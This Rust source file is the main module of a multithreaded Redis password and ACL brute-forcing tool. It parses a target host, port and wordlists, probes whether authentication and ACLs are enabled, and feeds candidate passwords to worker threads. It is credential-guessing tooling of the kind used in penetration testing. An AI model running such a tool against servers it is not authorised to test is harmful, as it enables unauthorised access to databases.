use std::{
    fs::File,
    io::{prelude::*, BufReader},
    thread,
    sync::{Arc}, error::Error, process
};
use connection::Connection;
use parking_lot::RwLock;
use crossbeam_queue::{SegQueue};
use clap::{Parser};
use worker::Worker;


pub mod worker;
pub mod connection;

/// Redis brute forcer
#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
pub struct Args {
   /// Redis host
   #[arg(short, long, default_value="127.0.0.1")]
   ip: String,

   /// Redis port
   #[arg(long, default_value="6379")]
   port: String,

   /// Username list for ACL brute forcing
   #[arg(short, long, default_value="")]
   users: String,

   /// Password file
   #[arg(short, long)]
   passwords: String,

   /// Number of threads to use
   #[arg(short, long, default_value_t=5)]
   threads: u8,
}

pub fn run(args: Args) -> Result<(), Box<dyn Error>> {
    check_redis(&args);

    let arc_users = Arc::new(RwLock::new(load_users(&args.users)));
    let arc_q = Arc::new(SegQueue::new());
    let arc_args = Arc::new(args);

    let mut thread_handles_aq: Vec<thread::JoinHandle<()>> = Vec::new();

    thread_handles_aq.push(run_producer(arc_q.clone(), arc_args.clone()));

    for _ in 1..arc_args.threads+1 {
        let mut worker = Worker::new(arc_users.clone(), arc_q.clone(), arc_args.clone());
        thread_handles_aq.push(thread::spawn(move || {
            worker.run_queue();
        }));
    }

    thread_handles_aq
    .into_iter()
    .for_each(|th| th.join().expect("can't join thread"));

    Ok(())
}


fn check_redis(args: &Args) {
    let mut connection = Connection::new(&args.ip, &args.port);

    is_password_enabled(&mut connection);

    if args.users != "" {
        is_acl_supported(&mut connection);
    }
}

fn is_acl_supported(connection: &mut Connection) {
    let response_raw = connection.send_and_receive("AUTH eba303a7c8d945d0a92533c51435fc57 baaeca0729774c04b6a8853b8000ab80\r\n".to_string());
    let response = String::from_utf8(response_raw).unwrap();

    if response.starts_with("-ERR wrong number of arguments") {
        println!("[-] Redis version does not appear to support ACLs (version 5 or older)");
        process::exit(1);
    }
}

fn is_password_enabled(connection: &mut Connection) {
    let response_raw = connection.send_and_receive("ECHO HELLO\r\n".to_string());
    let response = String::from_utf8(response_raw).unwrap();

    if !response.starts_with("-NOAUTH") {
        println!("[-] Authentication may not be enabled (or target isn't a Redis server)");
        process::exit(1);
    }
}


fn load_users(userfile: &String) -> Vec<String> {
    let mut users: Vec<String> = Vec::new();
    if userfile == "" {
        return users;
    }

    let file = File::open(userfile).unwrap_or_else(|err| {
        eprintln!("[-] Unable to open user list: {err}");
        process::exit(1);
    });
    let file_reader = BufReader::new(file);
    for line in file_reader.lines() {
        match line {
            // AUTH strings sent as AUTH 'pass' ...
            // must escape single quotes for valid checking
            Ok(username) => users.push(username.replace("'", "\\'")),
            Err(_) => continue,
        }
    }

    users
}

fn run_producer(q: Arc<SegQueue<String>>, args: Arc<Args>) -> thread::JoinHandle<()> {
    thread::spawn(move || {
        let file = File::open(&args.passwords).unwrap_or_else(|err| {
            eprintln!("[-] Unable to open password wordlist: {err}");
            process::exit(1);
        });
        let file_reader = BufReader::new(file);
        for line in file_reader.lines() {
            match line {
                // AUTH strings sent as AUTH 'pass' ...
                // must escape single quotes for valid checking
                Ok(password) => q.push(password.replace("'", "\\'")),
                Err(_) => continue,
            }
        }
    })
}
